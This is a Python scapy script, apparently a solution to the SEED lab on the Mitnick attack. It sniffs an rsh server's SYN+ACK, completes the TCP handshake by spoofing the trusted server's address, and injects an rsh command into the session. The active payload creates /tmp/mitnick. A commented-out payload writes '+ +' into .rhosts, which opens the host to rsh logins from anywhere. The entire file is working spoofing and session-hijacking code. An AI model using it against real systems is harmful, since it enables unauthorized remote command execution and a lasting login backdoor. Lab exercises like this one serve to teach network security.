#!/usr/bin/python3
from scapy.all import *
import time

x_ip = "10.9.0.5" #X-Terminal
srv_ip = "10.9.0.6" #The trusted server

x_port = 514 #port number used by X-Terminal
srv_port = 1023 #port number used by the trusted server
srv_port2 = 9090 #Second port number of a trusted server
syn_seq = 3601142775 #continuting the seq number from previous packet capture

# Spoof the ACK to finish 3-way handshake initiated by the attacker
# After that, spoof a rsh data packet
# We are only allowed to use the sequence number in the captured packet

def spoof(pkt):
    old_tcp = pkt[TCP]

    if old_tcp.flags == 'SA':
        # spoof SYN+ACK to finish the handshake protocol
        ip = IP(src = srv_ip, dst = x_ip)
        tcp = TCP(sport = srv_port, dport = x_port, seq = syn_seq, ack = old_tcp.seq + 1, flags = "A")
        print(' {}-->{} Spoofing SYN+ACK'.format(tcp.sport, tcp.dport))
        send(ip/tcp, verbose = 0)

        #send rsh command to X-Terminal
        tcp.flags = "PA"
        data = str(srv_port2) + '\x00seed\x00seed\x00touch /tmp/mitnick\x00'
        #data = str(srv_port2) + '\x00seed\x00seed\x00echo + + > .rhosts\x00'
        print('      Sending data: {}'.format(data))
        send(ip/tcp/data, verbose = 0)


f = 'tcp and src host {} and src port {} and dst host {} and dst port {}'
myFilter = f.format(x_ip, x_port, srv_ip, srv_port)
pkt = sniff(iface = 'br-78a5f07c943f', filter = myFilter, prn = spoof)
